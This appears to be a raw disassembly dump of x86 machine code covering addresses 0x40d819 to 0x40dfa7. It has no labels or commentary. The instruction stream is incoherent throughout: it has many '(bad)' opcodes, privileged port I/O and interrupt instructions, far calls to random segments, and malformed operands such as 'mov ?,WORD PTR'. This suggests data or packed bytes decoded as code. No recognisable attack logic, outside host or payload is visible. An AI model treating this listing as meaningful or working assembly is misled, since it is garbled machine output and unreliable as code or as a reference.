  40d819:	jle    0x40d80f
  40d81b:	pop    esi
  40d81c:	ret    0x4d75
  40d81f:	mov    ds:0xac92abe9,eax
  40d824:	sar    BYTE PTR [eax-0x61],1
  40d827:	inc    ebp
  40d828:	mov    cl,BYTE PTR [ebx]
  40d82a:	es loope 0x40d83f
  40d82d:	xchg   DWORD PTR ds:0xb4340e88,esi
  40d833:	and    edx,edi
  40d835:	psadbw mm5,QWORD PTR [edx+0x66]
  40d839:	ret    
  40d83a:	out    0x41,eax
  40d83c:	mov    ds:0xc65d0028,eax
  40d841:	push   esp
  40d842:	fstp   DWORD PTR [ecx+0x8]
  40d845:	adc    al,0x82
  40d847:	dec    eax
  40d848:	sti    
  40d849:	loop   0x40d85d
  40d84b:	sub    eax,0x937f93b0
  40d850:	dec    esi
  40d851:	daa    
  40d852:	mov    cs,WORD PTR [edi-0x4314a9ab]
  40d858:	out    0xdc,eax
  40d85a:	aad    0xec
  40d85c:	bound  edi,QWORD PTR [esi+0x39]
  40d85f:	sar    DWORD PTR [edx+0x3940967c],0xd
  40d866:	mov    eax,0x384feb6
  40d86b:	or     edx,DWORD PTR [edx+0x70b24acd]
  40d871:	loop   0x40d8bd
  40d873:	mov    ebp,0xccf493b5
  40d878:	add    BYTE PTR [edx],al
  40d87a:	arpl   WORD PTR [esi],dx
  40d87c:	mov    ecx,ss
  40d87e:	push   ds
  40d87f:	inc    ebp
  40d880:	sub    al,0xc0
  40d882:	mov    esi,0xfc0ec8da
  40d887:	popa   
  40d888:	and    DWORD PTR [ebx],ebx
  40d88a:	je     0x40d865
  40d88c:	and    eax,0x5b938299
  40d891:	repnz xlat BYTE PTR ds:[ebx]
  40d893:	sub    dl,BYTE PTR [ecx+0x7d140638]
  40d899:	xchg   esi,eax
  40d89a:	ins    BYTE PTR es:[edi],dx
  40d89b:	cwde   
  40d89c:	jae    0x40d847
  40d89e:	and    al,0xeb
  40d8a0:	pushf  
  40d8a1:	and    DWORD PTR [ebp-0x74dfce2e],esi
  40d8a7:	retf   0xac27
  40d8aa:	shl    DWORD PTR [ebx+0x6f],cl
  40d8ad:	call   0x32c1:0x41784e3d
  40d8b4:	sub    BYTE PTR [eax+0x58b5f666],ch
  40d8ba:	aam    0x0
  40d8bc:	push   eax
  40d8bd:	jo     0x40d8f4
  40d8bf:	xchg   esi,eax
  40d8c0:	mov    edi,0x7c582a52
  40d8c5:	add    BYTE PTR [ebp+0x54739e8],ch
  40d8cb:	xchg   ebx,eax
  40d8cc:	jb     0x40d8f0
  40d8ce:	xchg   esp,eax
  40d8cf:	shl    BYTE PTR [ecx-0x4f14683c],0x7a
  40d8d6:	pop    ebp
  40d8d7:	or     ebx,ebx
  40d8d9:	mov    al,ds:0x8bfeb816
  40d8de:	xchg   edi,eax
  40d8df:	rol    DWORD PTR [edi+eiz*4],cl
  40d8e2:	stos   BYTE PTR es:[edi],al
  40d8e3:	mov    esi,0x3747148c
  40d8e8:	shl    DWORD PTR [eax+edi*2],1
  40d8eb:	xor    al,dl
  40d8ed:	add    DWORD PTR [esi+0x50],edx
  40d8f0:	not    BYTE PTR [ecx+0x44]
  40d8f3:	int3   
  40d8f4:	std    
  40d8f5:	push   ds
  40d8f6:	(bad)  
  40d8f7:	pop    es
  40d8f8:	pop    edx
  40d8f9:	hlt    
  40d8fa:	push   edi
  40d8fb:	popf   
  40d8fc:	out    dx,al
  40d8fd:	ja     0x40d8b6
  40d8ff:	cs xchg ecx,eax
  40d901:	or     eax,0x12561183
  40d906:	jb     0x40d91b
  40d908:	xchg   edx,eax
  40d909:	das    
  40d90a:	push   ebx
  40d90b:	sar    BYTE PTR [edi+ebp*8+0xff8930f],0x7b
  40d913:	cmp    ecx,ebx
  40d915:	pop    eax
  40d916:	icebp  
  40d917:	adc    BYTE PTR [esi+0x42],bl
  40d91a:	inc    eax
  40d91b:	mov    al,ds:0x72515afa
  40d920:	gs mov bl,0xdd
  40d923:	mov    ah,0x12
  40d925:	cs inc ecx
  40d927:	out    dx,eax
  40d928:	shl    al,1
  40d92a:	dec    esi
  40d92b:	pop    edx
  40d92c:	inc    BYTE PTR [ebx]
  40d92e:	das    
  40d92f:	repz stc 
  40d931:	jge    0x40d8e8
  40d933:	pop    ss
  40d934:	or     eax,0x1d8e9c17
  40d939:	loop   0x40d8dd
  40d93b:	xor    eax,0x59366b83
  40d940:	xchg   esi,esi
  40d942:	addr16 pop es
  40d944:	jmp    0xc50a4eb3
  40d949:	outs   dx,BYTE PTR ds:[esi]
  40d94a:	jecxz  0x40d98c
  40d94c:	or     bl,BYTE PTR [ebp+0x382c845a]
  40d952:	mov    dh,0xf4
  40d954:	mov    dh,0xb0
  40d956:	je     0x40d971
  40d958:	sbb    al,0x59
  40d95a:	lods   al,BYTE PTR ds:[esi]
  40d95b:	mov    gs,WORD PTR [eax+ebp*2-0x150c2d82]
  40d962:	ror    DWORD PTR [eax-0x75612bfc],1
  40d968:	out    dx,eax
  40d969:	xchg   esi,eax
  40d96a:	mov    ds:0x22987077,eax
  40d96f:	pop    ss
  40d970:	xchg   edi,edx
  40d972:	jle    0x40d99e
  40d974:	push   0x2774a75d
  40d979:	pop    ebp
  40d97a:	stos   BYTE PTR es:[edi],al
  40d97b:	sti    
  40d97c:	dec    ebp
  40d97d:	(bad)  
  40d97e:	sahf   
  40d97f:	push   edx
  40d980:	sbb    cl,BYTE PTR [ebx]
  40d982:	lods   al,BYTE PTR ds:[esi]
  40d983:	stos   BYTE PTR es:[edi],al
  40d984:	fst    st(1)
  40d986:	jg     0x40d96d
  40d988:	jp     0x40d944
  40d98a:	fdivr  QWORD PTR [edi-0x4f]
  40d98d:	hlt    
  40d98e:	hlt    
  40d98f:	add    BYTE PTR [edi+ebx*2-0x1f065691],ch
  40d996:	in     eax,0xf2
  40d998:	cmc    
  40d999:	test   BYTE PTR [edx+0x2f436be],ch
  40d99f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40d9a1:	push   es
  40d9a2:	shl    al,1
  40d9a4:	push   esp
  40d9a5:	(bad)  
  40d9a6:	mov    dl,0x25
  40d9a8:	aam    0x2d
  40d9aa:	inc    edi
  40d9ab:	scas   al,BYTE PTR es:[edi]
  40d9ac:	test   BYTE PTR [ecx+0x42fcd03c],dl
  40d9b2:	scas   eax,DWORD PTR es:[edi]
  40d9b3:	inc    edx
  40d9b4:	ja     0x40d9d0
  40d9b6:	mov    cl,0xa7
  40d9b8:	loopne 0x40d9be
  40d9ba:	(bad)  
  40d9bb:	mov    edi,DWORD PTR [ecx+0x457e1a38]
  40d9c1:	pop    ss
  40d9c2:	push   eax
  40d9c3:	dec    edx
  40d9c4:	mov    ss,ebp
  40d9c6:	push   ebx
  40d9c7:	retf   
  40d9c8:	dec    eax
  40d9c9:	and    ecx,DWORD PTR [edi-0x4c387d97]
  40d9cf:	mov    esi,0x450637d5
  40d9d4:	pusha  
  40d9d5:	icebp  
  40d9d6:	imul   eax,edi,0xc5839ccd
  40d9dc:	xor    al,0x51
  40d9de:	ret    0x595f
  40d9e1:	adc    al,BYTE PTR [ebx-0xe3e3d17]
  40d9e7:	rcr    eax,0xdc
  40d9ea:	(bad)  
  40d9eb:	push   ds
  40d9ec:	inc    edx
  40d9ed:	std    
  40d9ee:	pop    ebp
  40d9ef:	jne    0x40d9f9
  40d9f1:	adc    eax,0xa05db6e6
  40d9f6:	(bad)  
  40d9f7:	mov    BYTE PTR ss:[ebp-0x3362e70e],cl
  40d9fe:	mov    eax,0x38084445
  40da03:	stc    
  40da04:	inc    esi
  40da05:	clc    
  40da06:	aas    
  40da07:	adc    ebp,0xa948d2ea
  40da0d:	(bad)  
  40da0e:	call   0xb07a2319
  40da13:	(bad)  
  40da14:	xchg   ebp,eax
  40da15:	and    al,0x2
  40da17:	cmp    cl,BYTE PTR [ebp-0x410492c5]
  40da1d:	mov    eax,0x7c3003a8
  40da22:	ins    DWORD PTR es:[edi],dx
  40da23:	jb     0x40d9b1
  40da25:	jmp    0xf2e4:0xf7100e82
  40da2c:	xchg   ah,cl
  40da2e:	pop    ds
  40da2f:	cmp    ah,dh
  40da31:	fucomi st,st(1)
  40da33:	ins    BYTE PTR es:[edi],dx
  40da34:	or     BYTE PTR [ebx+0x53e324a7],ah
  40da3a:	cwde   
  40da3b:	out    0x2e,al
  40da3d:	or     DWORD PTR [ecx+0x5d],ebx
  40da40:	fmul   DWORD PTR [edi]
  40da42:	push   ss
  40da43:	dec    eax
  40da44:	mov    ds:0x6c0df7c7,al
  40da49:	call   0x2376:0xeae02e23
  40da50:	test   eax,0xf38cfc1d
  40da55:	call   0x8aa2be6a
  40da5a:	(bad)  
  40da5b:	int3   
  40da5c:	(bad)  
  40da5d:	sti    
  40da5e:	arpl   WORD PTR es:[ecx],dx
  40da61:	lea    edi,[edx-0xda56252]
  40da67:	pop    ebx
  40da68:	jno    0x40da31
  40da6a:	into   
  40da6b:	aad    0x7d
  40da6d:	bound  esp,QWORD PTR [ebx]
  40da6f:	adc    BYTE PTR [eax+0x3145b735],bh
  40da75:	ret    0xe04f
  40da78:	pushf  
  40da79:	lods   al,BYTE PTR ds:[esi]
  40da7a:	xchg   DWORD PTR [ebp-0x41],edi
  40da7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da7e:	pop    es
  40da7f:	cmp    BYTE PTR [bp-0x276c],ch
  40da84:	xchg   ecx,ebp
  40da86:	and    al,0x3f
  40da88:	or     DWORD PTR [edx],esp
  40da8a:	fwait
  40da8b:	fs sbb al,0x58
  40da8e:	call   0xe932:0xda8a7b3
  40da95:	ror    dl,0x4f
  40da98:	dec    eax
  40da99:	je     0x40daad
  40da9b:	nop
  40da9c:	shr    DWORD PTR [ebx-0x7c],cl
  40da9f:	inc    edx
  40daa0:	mov    dh,0x72
  40daa2:	push   ds
  40daa3:	sbb    dh,BYTE PTR [esi+edx*8]
  40daa6:	dec    edi
  40daa7:	xor    eax,0xa84b1681
  40daac:	pusha  
  40daad:	cmp    eax,0xe40bc5c4
  40dab2:	mov    BYTE PTR [eax],ah
  40dab4:	push   edx
  40dab5:	add    BYTE PTR [esp+ebx*1+0x71],dh
  40dab9:	xchg   BYTE PTR [ebp-0x71085915],bl
  40dabf:	dec    eax
  40dac0:	aad    0xa2
  40dac2:	add    eax,0x1ef9afde
  40dac7:	nop
  40dac8:	enter  0x1232,0xb6
  40dacc:	not    BYTE PTR [eax+edx*1]
  40dacf:	aad    0x61
  40dad1:	sbb    eax,DWORD PTR ds:0x496f4ad4
  40dad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dad8:	jle    0x40db26
  40dada:	(bad)  
  40dadb:	sub    eax,0xe589bc0f
  40dae0:	std    
  40dae1:	int    0x10
  40dae3:	dec    ebx
  40dae4:	inc    eax
  40dae5:	(bad)  
  40dae8:	in     eax,dx
  40dae9:	shl    BYTE PTR [eax+ecx*8-0x19],cl
  40daed:	xchg   ebp,eax
  40daee:	int    0xd9
  40daf0:	dec    eax
  40daf1:	ret    0xf200
  40daf4:	xor    DWORD PTR [ebx+0x40],0xffffffea
  40daf8:	jp     0x40da95
  40dafa:	jmp    0xafd187f6
  40daff:	out    dx,al
  40db00:	pop    edx
  40db01:	mov    esi,ecx
  40db03:	mov    bl,0xfd
  40db05:	aam    0x7e
  40db07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db08:	sti    
  40db09:	sub    DWORD PTR [esi],0x99ce6d1d
  40db0f:	retf   0x42bb
  40db12:	xor    al,0x5c
  40db14:	and    DWORD PTR [esi-0x77cc62bf],ebx
  40db1a:	mov    esp,0x11333002
  40db1f:	fwait
  40db20:	xor    al,0x80
  40db22:	popa   
  40db23:	call   0x2192:0x941d3aa3
  40db2a:	imul   ebx,DWORD PTR [ebx-0x44],0x8
  40db2e:	test   ebx,esi
  40db30:	push   ds
  40db31:	dec    ebx
  40db32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db33:	in     al,0xe6
  40db35:	sub    BYTE PTR [edx+0xb465193],0x69
  40db3c:	lds    esp,FWORD PTR [edi-0x16b6f99d]
  40db42:	and    al,0xd2
  40db44:	lock sub eax,0x70a0e01e
  40db4a:	cmp    dl,BYTE PTR [esp+edx*1-0x26]
  40db4e:	sub    DWORD PTR [ebp+0x19],0x4f
  40db52:	ror    DWORD PTR [edi+0x370db7eb],0xe3
  40db59:	lds    edi,FWORD PTR [ebx]
  40db5b:	outs   dx,DWORD PTR ds:[esi]
  40db5c:	jb     0x40db09
  40db5e:	dec    eax
  40db5f:	push   edi
  40db60:	sti    
  40db61:	add    eax,0x60e09594
  40db66:	out    dx,eax
  40db67:	xor    al,0xc4
  40db69:	int    0x3e
  40db6b:	and    esp,DWORD PTR [ecx-0x45757470]
  40db71:	xor    BYTE PTR [eax+ecx*1],dh
  40db74:	jb     0x40db1c
  40db76:	mov    esp,0xa759d68a
  40db7b:	ror    BYTE PTR [ebp-0x442a65c6],0xb9
  40db82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db83:	xchg   DWORD PTR [esi+0x490d2c52],edx
  40db89:	adc    ebx,DWORD PTR [edx-0x3e]
  40db8c:	xchg   dl,dl
  40db8e:	ror    BYTE PTR [edi+0x11],1
  40db91:	in     al,0x3a
  40db93:	sbb    ch,BYTE PTR [edx+0x66b63640]
  40db99:	retf   
  40db9a:	fcomp  st(6)
  40db9c:	pop    esp
  40db9d:	dec    edi
  40db9e:	dec    edx
  40db9f:	inc    edi
  40dba0:	aam    0x29
  40dba2:	add    al,0x4a
  40dba4:	dec    edi
  40dba5:	xchg   esp,eax
  40dba6:	adc    edi,edx
  40dba8:	xor    DWORD PTR ds:0xd25eddab,esp
  40dbae:	mov    cl,0x76
  40dbb0:	sahf   
  40dbb1:	dec    eax
  40dbb2:	inc    esi
  40dbb3:	sbb    BYTE PTR [ebp-0x73],al
  40dbb6:	repz mov ah,0x74
  40dbb9:	mov    ebp,DWORD PTR [edi-0x44]
  40dbbc:	xchg   ebp,eax
  40dbbd:	mov    ah,0x20
  40dbbf:	mov    dh,0x9a
  40dbc1:	shr    edi,cl
  40dbc3:	movaps xmm6,XMMWORD PTR [ebx]
  40dbc6:	and    bl,BYTE PTR [edx-0x1ad390cd]
  40dbcc:	pop    eax
  40dbcd:	cs repnz aad 0xdc
  40dbd1:	icebp  
  40dbd2:	pop    ebp
  40dbd3:	mov    dh,0xc2
  40dbd5:	inc    edi
  40dbd6:	out    0xf9,al
  40dbd8:	ja     0x40db73
  40dbda:	or     al,0xe8
  40dbdc:	xor    DWORD PTR [ecx-0x3e],ebp
  40dbdf:	fdivr  QWORD PTR [edx-0x3a]
  40dbe2:	add    al,0x16
  40dbe4:	push   ebp
  40dbe5:	retf   
  40dbe6:	cmp    BYTE PTR [edx-0x4fce0d8f],bl
  40dbec:	enter  0xc217,0xf7
  40dbf0:	and    DWORD PTR [edi+0x30a1c85e],eax
  40dbf6:	inc    esi
  40dbf7:	jle    0x40dbee
  40dbf9:	jecxz  0x40dbdd
  40dbfb:	or     eax,0x1714cf13
  40dc00:	lods   al,BYTE PTR ds:[esi]
  40dc01:	mov    esi,0x987def08
  40dc06:	pusha  
  40dc07:	out    0xe7,al
  40dc09:	push   0x43
  40dc0b:	(bad)  
  40dc0d:	add    cl,BYTE PTR [edx]
  40dc0f:	xor    eax,edi
  40dc11:	push   0xfcc1ff61
  40dc16:	sbb    edi,edi
  40dc18:	(bad)  
  40dc19:	and    BYTE PTR [edi+0x39],ah
  40dc1c:	rol    DWORD PTR [esi],1
  40dc1e:	iret   
  40dc1f:	dec    edx
  40dc20:	mov    cl,0xd8
  40dc22:	cwde   
  40dc23:	inc    ebp
  40dc24:	mov    ds:0x938fedcd,eax
  40dc29:	(bad)  
  40dc2b:	test   BYTE PTR [ebp+0x48],0x85
  40dc2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc31:	fist   DWORD PTR ds:0xd0b440f4
  40dc37:	clc    
  40dc38:	sub    ebx,DWORD PTR [esi]
  40dc3a:	inc    eax
  40dc3b:	ins    DWORD PTR es:[edi],dx
  40dc3c:	fdivrp st(3),st
  40dc3e:	stc    
  40dc3f:	push   es
  40dc40:	jge    0x40dc58
  40dc42:	mov    edi,0x63d3a752
  40dc47:	jmp    0x2171:0xf42899aa
  40dc4e:	push   ss
  40dc4f:	add    al,0x73
  40dc51:	out    0xb8,eax
  40dc53:	mov    ?,WORD PTR ds:0xd5cb7c75
  40dc59:	cmp    al,0xe
  40dc5b:	mov    cl,0x54
  40dc5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc5e:	or     eax,0x3ec7d8b5
  40dc63:	dec    esi
  40dc64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc65:	jno    0x40dc73
  40dc67:	push   esp
  40dc68:	cmp    eax,0x99afff2e
  40dc6d:	test   al,0xd
  40dc6f:	mov    ecx,0x9342bf1f
  40dc74:	fwait
  40dc75:	aam    0x35
  40dc77:	clc    
  40dc78:	jo     0x40dcb0
  40dc7a:	adc    al,0x87
  40dc7c:	shl    DWORD PTR [ebx+0x4b],1
  40dc7f:	jae    0x40dc73
  40dc81:	xadd   dl,bl
  40dc84:	xchg   esp,eax
  40dc85:	push   esi
  40dc86:	pop    ss
  40dc87:	test   BYTE PTR [esi+ebp*4],dh
  40dc8a:	sub    esi,0x22c75c3d
  40dc90:	mov    BYTE PTR [ecx-0x6b4d9657],al
  40dc96:	btr    edi,esi
  40dc99:	cmp    eax,0x9090f989
  40dc9e:	in     eax,dx
  40dc9f:	sub    BYTE PTR [ebx-0x6],al
  40dca2:	pop    eax
  40dca3:	lea    edx,[esp+eiz*4-0x67]
  40dca7:	(bad)  
  40dca8:	sub    ah,BYTE PTR [ecx-0x7bd2bc49]
  40dcae:	fdiv   DWORD PTR [ebx-0x5a]
  40dcb1:	mov    dh,0xf7
  40dcb3:	push   esp
  40dcb4:	outs   dx,DWORD PTR ds:[esi]
  40dcb5:	jae    0x40dcc9
  40dcb7:	mov    eax,ds:0x453866a3
  40dcbc:	setge  BYTE PTR [edi-0x1c851cde]
  40dcc3:	sbb    edi,0xe
  40dcc6:	rcr    cl,0x6e
  40dcc9:	jle    0x40dca3
  40dccb:	int3   
  40dccc:	sub    ebp,ebx
  40dcce:	jae    0x40dd3a
  40dcd0:	and    BYTE PTR [ecx-0x2d],bh
  40dcd3:	ins    BYTE PTR es:[edi],dx
  40dcd4:	fimul  DWORD PTR [edx]
  40dcd6:	xchg   BYTE PTR [ebx+0x30],cl
  40dcd9:	fwait
  40dcda:	out    dx,eax
  40dcdb:	pop    ecx
  40dcdc:	cwde   
  40dcdd:	dec    esi
  40dcde:	add    ah,BYTE PTR [ebx-0x7c]
  40dce1:	mov    edx,0x165f45b0
  40dce6:	jb     0x40dc9a
  40dce8:	sti    
  40dce9:	push   ss
  40dcea:	mov    dh,0xbf
  40dcec:	lea    esp,[ebp-0x431eaf2b]
  40dcf2:	sbb    DWORD PTR [eax+0x2f],eax
  40dcf5:	fbld   TBYTE PTR [edi+0x75]
  40dcf8:	mov    esp,0xe36c31f2
  40dcfd:	pop    edx
  40dcfe:	mov    bh,0x2d
  40dd00:	hlt    
  40dd01:	outs   dx,BYTE PTR ds:[esi]
  40dd02:	(bad)  [ebp+0x10]
  40dd05:	add    al,0xa8
  40dd07:	sub    WORD PTR [ebp+0x2c4eeab9],0xd6c8
  40dd10:	jmp    0xeca72379
  40dd15:	cmp    DWORD PTR [ecx-0x3f],0x8e6789e2
  40dd1c:	in     eax,dx
  40dd1d:	dec    ebp
  40dd1e:	in     eax,dx
  40dd1f:	and    eax,0xd3f6369b
  40dd24:	adc    eax,esp
  40dd26:	and    edi,eax
  40dd28:	or     eax,0x5f31a9c2
  40dd2d:	addr16 jbe 0x40dccf
  40dd30:	adc    DWORD PTR [ecx],ebp
  40dd32:	push   eax
  40dd34:	xchg   esp,eax
  40dd35:	sbb    DWORD PTR [esi],edx
  40dd37:	mov    ah,0xdf
  40dd39:	or     DWORD PTR [ecx+0x70],eax
  40dd3c:	mov    ecx,0x53980cb0
  40dd41:	test   BYTE PTR [edx+0x6d],ch
  40dd44:	scas   al,BYTE PTR es:[edi]
  40dd45:	adc    al,0xbe
  40dd47:	cli    
  40dd48:	xchg   esi,eax
  40dd49:	outs   dx,BYTE PTR ds:[esi]
  40dd4a:	mov    bh,0x33
  40dd4c:	popf   
  40dd4d:	aad    0xce
  40dd4f:	lock in al,dx
  40dd51:	nop
  40dd52:	fild   QWORD PTR [ebx+0x16]
  40dd55:	inc    eax
  40dd56:	xchg   ebp,eax
  40dd57:	or     bl,ah
  40dd59:	repz fucomip st,st(0)
  40dd5c:	stos   BYTE PTR es:[edi],al
  40dd5d:	nop
  40dd5e:	mov    ch,bh
  40dd60:	xlat   BYTE PTR ds:[ebx]
  40dd61:	repz sbb edi,DWORD PTR [esi+0x2761bca0]
  40dd68:	imul   ebp,DWORD PTR [edx],0x5131ea90
  40dd6e:	sbb    BYTE PTR [esi+eiz*8],ah
  40dd71:	adc    cl,BYTE PTR [edi-0x35]
  40dd74:	inc    esp
  40dd75:	jns    0x40dde6
  40dd77:	jecxz  0x40ddd1
  40dd79:	std    
  40dd7a:	pusha  
  40dd7b:	loopne 0x40dd30
  40dd7d:	imul   esi,DWORD PTR [eax],0x3bb5e64c
  40dd83:	inc    esi
  40dd84:	sub    BYTE PTR [esi],cl
  40dd86:	imul   ebx,ebx,0xc56b2583
  40dd8c:	xor    eax,DWORD PTR [eax+0x70]
  40dd8f:	push   edi
  40dd90:	mov    dl,0xb5
  40dd92:	call   0x644:0x769db320
  40dd99:	imul   esi,ecx,0xffffff96
  40dd9c:	push   ss
  40dd9d:	and    al,0xbc
  40dd9f:	mov    ds:0xe894460b,eax
  40dda4:	imul   eax,DWORD PTR [edx],0x72
  40dda7:	cld    
  40dda8:	sub    ch,bh
  40ddaa:	sbb    al,0x5e
  40ddac:	and    eax,0x44a7632
  40ddb1:	sahf   
  40ddb2:	or     eax,0xf14d4e9
  40ddb7:	inc    cx
  40ddb9:	dec    eax
  40ddba:	fwait
  40ddbb:	scas   al,BYTE PTR es:[edi]
  40ddbc:	or     BYTE PTR [esi],bl
  40ddbe:	test   BYTE PTR [edi+0xb],ch
  40ddc1:	js     0x40dd92
  40ddc3:	std    
  40ddc4:	in     eax,0x23
  40ddc6:	call   0x2a8:0x347113cc
  40ddcd:	(bad)  
  40ddce:	add    cl,ch
  40ddd0:	cmp    ch,ah
  40ddd2:	mov    edx,0x98611aa8
  40ddd7:	rcl    DWORD PTR [edx-0x7b08f1f1],1
  40dddd:	jns    0x40dd9d
  40dddf:	add    al,0x7e
  40dde1:	shr    DWORD PTR [ebx+0x6c],cl
  40dde4:	and    BYTE PTR [edx],al
  40dde6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dde7:	in     al,0xe0
  40dde9:	jae    0x40de2b
  40ddeb:	ficomp DWORD PTR [ebp+0x35e0693e]
  40ddf1:	int3   
  40ddf2:	test   BYTE PTR [edi+eax*1],cl
  40ddf5:	outs   dx,DWORD PTR ds:[esi]
  40ddf6:	or     cl,BYTE PTR [ebx]
  40ddf8:	adc    DWORD PTR ds:0xddd7d8aa,edx
  40ddfe:	sub    eax,0x15595f16
  40de03:	mov    ds:0x65d9427f,al
  40de08:	addr16 std 
  40de0a:	inc    esi
  40de0b:	pop    ecx
  40de0c:	mov    ch,0x2f
  40de0e:	addr16 or eax,0x58f83132
  40de14:	int    0x24
  40de16:	out    0x63,eax
  40de18:	arpl   WORD PTR [ebp+0x70],bp
  40de1b:	(bad)  
  40de1c:	(bad)  
  40de1e:	pop    ecx
  40de1f:	sub    bh,ch
  40de21:	xor    DWORD PTR [ebp+0x53b65a6e],ecx
  40de27:	int3   
  40de28:	xchg   DWORD PTR [esi+0x5],ecx
  40de2b:	mov    al,ds:0xe187fd54
  40de30:	xchg   edx,eax
  40de31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de32:	imul   ebx,ebp,0x3c
  40de35:	repz popf 
  40de37:	xor    al,0x8d
  40de39:	or     al,0xc4
  40de3b:	cmp    ah,BYTE PTR [ebx-0x3bd7ccff]
  40de41:	outs   dx,BYTE PTR ds:[esi]
  40de42:	stos   BYTE PTR es:[edi],al
  40de43:	retf   0xf763
  40de46:	and    bl,BYTE PTR [esi]
  40de48:	inc    eax
  40de49:	loope  0x40de09
  40de4b:	outs   dx,BYTE PTR ds:[esi]
  40de4c:	cdq    
  40de4d:	les    eax,FWORD PTR [edx]
  40de4f:	repz cmp bh,dl
  40de52:	mov    ?,WORD PTR [ecx-0x4cc677f9]
  40de58:	lods   eax,DWORD PTR ds:[esi]
  40de59:	outs   dx,DWORD PTR ds:[esi]
  40de5a:	jne    0x40de43
  40de5c:	cdq    
  40de5d:	pop    ecx
  40de5e:	enter  0x1beb,0x54
  40de62:	cmp    BYTE PTR [ecx+0x65],bh
  40de65:	pop    edi
  40de66:	popa   
  40de67:	mov    ax,0xe8d9
  40de6b:	or     BYTE PTR [ebx],al
  40de6d:	mov    edi,0x3654c610
  40de72:	xchg   ebp,eax
  40de73:	xor    eax,0x9e5115f
  40de78:	int    0x29
  40de7a:	add    bl,bl
  40de7c:	sbb    eax,0x20cff01b
  40de81:	push   ebx
  40de82:	mov    ebx,0x2a18f80
  40de87:	in     al,dx
  40de88:	sub    BYTE PTR [edx+ebp*4+0x698b908f],ah
  40de8f:	and    BYTE PTR [esi+0x58783fa],ch
  40de95:	mov    al,0x83
  40de97:	xor    eax,0x35c34df4
  40de9c:	xor    al,cl
  40de9e:	(bad)  
  40de9f:	inc    ebp
  40dea0:	test   al,0x1f
  40dea2:	sub    DWORD PTR [ebx],eax
  40dea4:	ins    DWORD PTR es:[edi],dx
  40dea5:	and    dl,al
  40dea7:	mov    ecx,DWORD PTR [ebx-0x31]
  40deaa:	fiadd  DWORD PTR [ebx-0x37efd540]
  40deb0:	inc    ebp
  40deb1:	int3   
  40deb2:	pushf  
  40deb3:	xchg   ebp,eax
  40deb4:	push   ebp
  40deb5:	mov    esi,0x4edc6375
  40deba:	pop    ecx
  40debb:	retf   0x41ca
  40debe:	sbb    eax,0xb4cfd426
  40dec3:	loopne 0x40de82
  40dec5:	mov    cs,WORD PTR [esi+eiz*1]
  40dec8:	jmp    0xe9f:0xb2264688
  40decf:	arpl   WORD PTR [ecx],si
  40ded1:	retf   0x1dcf
  40ded4:	sbb    al,0xf2
  40ded6:	inc    edx
  40ded7:	stos   BYTE PTR es:[edi],al
  40ded8:	in     eax,dx
  40ded9:	aaa    
  40deda:	aam    0x45
  40dedc:	dec    edi
  40dedd:	mov    ds:0x1e1b07d5,eax
  40dee2:	test   DWORD PTR [esi-0x7b],esp
  40dee5:	fdivr  st(7),st
  40dee7:	or     ah,0xb
  40deea:	cwde   
  40deeb:	(bad)  
  40deec:	xchg   esp,eax
  40deed:	adc    DWORD PTR [ebx+0x38],edx
  40def0:	aad    0x60
  40def2:	fild   WORD PTR [edx+edx*1-0x48]
  40def6:	data16 xchg ch,dl
  40def9:	jmp    0xfc1a:0x478523a3
  40df00:	scas   eax,DWORD PTR es:[edi]
  40df01:	mov    eax,ds:0xa5affe8f
  40df06:	test   eax,0xba7ed503
  40df0b:	dec    esi
  40df0c:	loop   0x40de93
  40df0e:	pop    edi
  40df0f:	mov    cs,WORD PTR [edx+0x56]
  40df12:	shl    BYTE PTR [eax],cl
  40df14:	mov    ds:0x3438f15a,al
  40df19:	cmpxchg DWORD PTR [edi],eax
  40df1c:	sbb    ebp,DWORD PTR [ecx-0x38468548]
  40df22:	cmp    BYTE PTR ds:0xa47d37af,ah
  40df28:	inc    DWORD PTR [ecx]
  40df2a:	addr16 (bad) 
  40df2c:	retf   
  40df2d:	jbe    0x40df33
  40df2f:	outs   dx,DWORD PTR ds:[esi]
  40df30:	(bad)  
  40df31:	je     0x40df05
  40df33:	loope  0x40df2c
  40df35:	mov    ecx,0xbcffcbf1
  40df3a:	jne    0x40df1c
  40df3c:	test   BYTE PTR [esi+0x67945291],cl
  40df42:	cmc    
  40df43:	mov    BYTE PTR [esi+0x4b696c4],cl
  40df49:	int    0x15
  40df4b:	(bad)  
  40df4c:	sbb    dl,BYTE PTR [esp+ebp*1-0x13]
  40df50:	(bad)  
  40df51:	hlt    
  40df52:	inc    edx
  40df53:	dec    ebp
  40df54:	test   BYTE PTR [ebx-0x7e0927aa],bh
  40df5a:	lea    edi,[ebx-0x8]
  40df5d:	popf   
  40df5e:	sti    
  40df5f:	cmc    
  40df60:	inc    ebx
  40df61:	add    DWORD PTR [ebp+0x369d20ea],esp
  40df67:	dec    ebx
  40df68:	mov    al,0x55
  40df6a:	call   0x9f1b:0xa54969cf
  40df71:	sbb    esp,DWORD PTR [ecx-0x4ef296af]
  40df77:	inc    edi
  40df78:	inc    esi
  40df79:	push   esp
  40df7a:	outs   dx,BYTE PTR ds:[esi]
  40df7b:	retf   0x1b4c
  40df7e:	fsub   st(4),st
  40df80:	icebp  
  40df81:	dec    edi
  40df82:	xor    esp,DWORD PTR [eax-0x283ec391]
  40df88:	adc    BYTE PTR [ebx-0x55ae370c],cl
  40df8e:	pop    edi
  40df8f:	stc    
  40df90:	push   ds
  40df91:	pop    edx
  40df92:	dec    edx
  40df93:	sub    ch,BYTE PTR [ecx-0x7cb993b8]
  40df99:	push   ecx
  40df9a:	cmp    al,0x28
  40df9c:	test   esi,ecx
  40df9e:	mov    fs,WORD PTR [eax+ebx*1-0x2b32d71d]
  40dfa5:	xor    dl,cl
  40dfa7:	retf   0x9677
